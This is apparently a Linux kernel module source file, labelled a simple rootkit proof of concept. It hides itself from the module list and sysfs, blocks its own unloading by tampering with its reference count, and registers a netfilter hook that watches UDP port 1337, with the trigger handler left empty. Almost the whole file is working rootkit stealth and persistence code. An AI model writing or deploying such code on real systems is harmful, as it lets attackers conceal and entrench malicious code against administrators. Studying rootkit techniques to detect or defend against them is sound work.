#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/list.h>
#include <linux/kobject.h>
#include <net/net_namespace.h>
#include <linux/skbuff.h>
#include <linux/udp.h>
#include <linux/ip.h>
#include <linux/netfilter_ipv4.h>

static void hide_qwirex(void);
static void ban_on_extraction_qwirex(void);
static unsigned int qwirex_hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state);

static unsigned int qwirex_hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
    if (!skb)
    {
        return NF_ACCEPT;
    }

    struct iphdr *ip = ip_hdr(skb);

    if (!ip)
    {
        return NF_ACCEPT;
    }

    if (ip->protocol == IPPROTO_UDP)
    {
        struct udphdr *udp = udp_hdr(skb);

        if (ntohs(udp->dest) == 1337)
        {

        }
    }

    return NF_ACCEPT;
}

static struct nf_hook_ops nho =
{
    .hook = qwirex_hook,
    .pf = PF_INET,
    .priority = NF_IP_PRI_FIRST,
    .hooknum = NF_INET_PRE_ROUTING,
};

static void hide_qwirex(void)
{
    struct list_head *qwirex_prev = NULL;
    struct list_head *qwirex_next = NULL;
    struct kobject *qwirex_kobj = &THIS_MODULE->mkobj.kobj;

    qwirex_prev = THIS_MODULE->list.prev;
    qwirex_next = THIS_MODULE->list.next;

    qwirex_next->prev = qwirex_prev;
    qwirex_prev->next = qwirex_next;

    THIS_MODULE->list.next = &THIS_MODULE->list;
    THIS_MODULE->list.prev = &THIS_MODULE->list;

    if (qwirex_kobj->sd)
        kobject_del(qwirex_kobj);
}

static void ban_on_extraction_qwirex(void)
{
    atomic_set(&THIS_MODULE->refcnt,2);
}

static int __init qwirex_init(void)
{
    hide_qwirex();
    ban_on_extraction_qwirex();

    nf_register_net_hook(&init_net,&nho);

    return 0;
}

static void __exit qwirex_exit(void)
{

}

module_init(qwirex_init);
module_exit(qwirex_exit);

MODULE_AUTHOR("0x00");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("a simple rootkit proof of concept");